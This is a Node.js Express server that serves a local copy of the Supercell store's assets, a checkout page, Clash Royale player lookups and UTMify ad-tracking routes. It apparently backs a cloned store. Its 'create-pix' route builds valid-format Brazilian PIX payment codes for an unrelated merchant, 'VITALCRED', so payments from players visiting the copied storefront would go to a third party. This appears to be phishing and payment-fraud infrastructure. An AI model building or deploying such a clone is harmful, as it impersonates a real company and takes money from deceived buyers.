/**
 * Servidor Principal para Railway/SquareCloud
 * Servidor unificado com todas as funcionalidades
 */

const express = require("express");
const path = require("path");
const fs = require("fs");
const cors = require("cors");

// Importa as rotas do UTMify (não inicia servidor separado)
const utmifyRouter = require("./utmify-proxy-server");

// ==========================================
// CONFIGURAÇÃO
// ==========================================
const PORT = process.env.PORT || 8080;

// ==========================================
// SERVIDOR PRINCIPAL
// ==========================================
const app = express();

app.use(cors());
app.use(express.json());

// ==========================================
// SERVIR ARQUIVOS ESTÁTICOS COM MAPEAMENTO CORRETO
// ==========================================

// Mapear /_next/ para store.supercell.com/_next/ (com decode de URL)
app.use(
  "/_next",
  express.static(path.join(__dirname, "store.supercell.com/_next"), {
    setHeaders: (res, filePath) => {
      // Definir MIME types corretos
      if (filePath.endsWith(".js")) {
        res.setHeader("Content-Type", "application/javascript");
      } else if (filePath.endsWith(".css")) {
        res.setHeader("Content-Type", "text/css");
      }
    },
  })
);

// Mapear /images/ para store.supercell.com/images/
app.use(
  "/images",
  express.static(path.join(__dirname, "store.supercell.com/images"))
);

// Mapear /rive-assets/ para store.supercell.com/rive-assets/
app.use(
  "/rive-assets",
  express.static(path.join(__dirname, "store.supercell.com/rive-assets"))
);

// Servir arquivos da raiz
app.use(express.static("."));

// ==========================================
// ROTAS PRINCIPAIS
// ==========================================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/checkout", (req, res) => {
  res.sendFile(path.join(__dirname, "checkout.html"));
});

// Rota para player API (real ou mock)
app.get("/player", async (req, res) => {
  const tag = req.query.tag;
  if (!tag) {
    return res.status(400).json({ error: "Tag é obrigatória" });
  }

  // Limpa o token removendo espaços, quebras de linha e caracteres inválidos
  const rawToken = process.env.CR_API_TOKEN || "";
  const apiToken = rawToken.trim().replace(/[\r\n\t]/g, "");

  // Se não tiver token configurado, retorna dados mockados
  if (!apiToken || apiToken === "seu_token_aqui" || apiToken.length < 50) {
    console.log(
      "⚠️ CR_API_TOKEN não configurado ou inválido, usando dados mockados"
    );
    return res.json({
      tag: tag,
      name: "Jogador Demo",
      expLevel: 50,
      trophies: 6500,
      bestTrophies: 7200,
      wins: 1500,
      losses: 800,
      clan: {
        tag: "#CLAN123",
        name: "Clash Royale BR",
      },
      _mock: true,
    });
  }

  // Chamada real à API do Clash Royale
  try {
    const fetch = (...args) =>
      import("node-fetch").then(({ default: fetch }) => fetch(...args));
    const cleanTag = tag.replace("#", "").replace("%23", "");
    const apiUrl = `https://api.clashroyale.com/v1/players/%23${cleanTag}`;

    console.log(`🎮 Buscando jogador na API real: ${cleanTag}`);
    console.log(`🔑 Token length: ${apiToken.length} chars`);

    const response = await fetch(apiUrl, {
      method: "GET",
      headers: {
        Authorization: "Bearer " + apiToken,
        Accept: "application/json",
      },
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Erro API Clash Royale:", response.status, errorText);

      // Se falhar, retorna mock como fallback
      return res.json({
        tag: tag,
        name: "Jogador Demo",
        expLevel: 50,
        trophies: 6500,
        bestTrophies: 7200,
        wins: 1500,
        losses: 800,
        clan: {
          tag: "#CLAN123",
          name: "Clash Royale BR",
        },
        _mock: true,
        _error: `API error: ${response.status}`,
      });
    }

    const data = await response.json();
    console.log("✅ Dados reais recebidos da API Clash Royale");
    return res.json(data);
  } catch (error) {
    console.error("❌ Erro ao buscar jogador:", error.message);

    // Se der erro, retorna mock como fallback
    return res.json({
      tag: tag,
      name: "Jogador Demo",
      expLevel: 50,
      trophies: 6500,
      bestTrophies: 7200,
      wins: 1500,
      losses: 800,
      clan: {
        tag: "#CLAN123",
        name: "Clash Royale BR",
      },
      _mock: true,
      _error: error.message,
    });
  }
});

// API mock para criar PIX
app.post("/api/create-pix", (req, res) => {
  const { amount, customer, items } = req.body;

  // Gera um UUID único para o PIX
  const uuid = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
    /[xy]/g,
    function (c) {
      const r = (Math.random() * 16) | 0;
      const v = c === "x" ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    }
  );

  // URL do PIX no formato correto
  const pixUrl = `qrcode.a55scd.com.br/pix/${uuid}`;

  // Formata o valor com 2 casas decimais
  const formattedAmount = (amount || 0).toFixed(2);

  // Gera o código PIX no formato BRCode EMV correto
  // Formato: 00020101021226830014br.gov.bcb.pix2561{url}5204000053039865802BR5909{nome}6008{cidade}61080331101062070503***6304{crc}
  const pixPayload = `00020101021226${(14 + pixUrl.length)
    .toString()
    .padStart(2, "0")}0014br.gov.bcb.pix25${pixUrl.length
    .toString()
    .padStart(
      2,
      "0"
    )}${pixUrl}5204000053039865802BR5909VITALCRED6008SAOPAULO61080331101062070503***6304`;

  // Calcula CRC16 para validar o código
  const crc = calculateCRC16(pixPayload);
  const pixCode = pixPayload + crc;

  res.json({
    success: true,
    pix: {
      qrcode: pixCode,
    },
    transactionId: `TX-${Date.now()}`,
    expirationDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
  });
});

// Função para calcular CRC16 CCITT-FALSE (padrão PIX)
function calculateCRC16(payload) {
  const polynomial = 0x1021;
  let crc = 0xffff;

  for (let i = 0; i < payload.length; i++) {
    crc ^= payload.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if ((crc & 0x8000) !== 0) {
        crc = ((crc << 1) ^ polynomial) & 0xffff;
      } else {
        crc = (crc << 1) & 0xffff;
      }
    }
  }

  return crc.toString(16).toUpperCase().padStart(4, "0");
}

// Carrega dados mockados da API
const apiDataPath = path.join(__dirname, "api-data");
if (fs.existsSync(apiDataPath)) {
  try {
    const manifestPath = path.join(apiDataPath, "manifest.json");
    if (fs.existsSync(manifestPath)) {
      const manifest = JSON.parse(fs.readFileSync(manifestPath, "utf-8"));

      // O manifest é um array direto, não um objeto com propriedade apis
      const apis = Array.isArray(manifest) ? manifest : manifest.apis || [];

      apis.forEach((api) => {
        // Usa url como path se path não existir
        const apiPath = api.path || new URL(api.url).pathname;
        const filePath = path.join(apiDataPath, api.file);

        if (fs.existsSync(filePath)) {
          const data = JSON.parse(fs.readFileSync(filePath, "utf-8"));
          app.get(apiPath, (req, res) => {
            res.json(data);
          });
          app.post(apiPath, (req, res) => {
            res.json(data);
          });
          console.log(`📦 Rota mockada: ${apiPath}`);
        }
      });
      console.log(`✅ ${apis.length} rotas da API carregadas`);
    }
  } catch (error) {
    console.error("⚠️ Erro ao carregar manifest.json:", error.message);
  }
}

// Monta as rotas do UTMify no servidor principal
app.use(utmifyRouter);

// Rota de saúde para Railway
app.get("/health", (req, res) => {
  res.status(200).json({
    status: "healthy",
    service: "Clash Royale Store",
    timestamp: new Date().toISOString(),
    port: PORT,
  });
});

// Rota para descobrir o IP público do servidor
app.get("/get-ip", async (req, res) => {
  try {
    const fetch = (...args) =>
      import("node-fetch").then(({ default: fetch }) => fetch(...args));
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    res.json({
      ip: data.ip,
      message:
        "🎯 Use este IP na API do Clash Royale: developer.clashroyale.com",
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    res.status(500).json({
      error: error.message,
      message: "Tente acessar https://api.ipify.org manualmente",
    });
  }
});

// ==========================================
// INICIA SERVIDOR
// ==========================================
app.listen(PORT, "0.0.0.0", () => {
  console.log("🎮 Clash Royale Store rodando na porta", PORT);
  console.log("📊 UTMify Proxy integrado no mesmo servidor");
  console.log("🌐 Ambiente:", process.env.NODE_ENV || "development");
  console.log("✅ Servidor pronto e aceitando conexões!");
  console.log("🏥 Healthcheck disponível em /health");
});

module.exports = app;
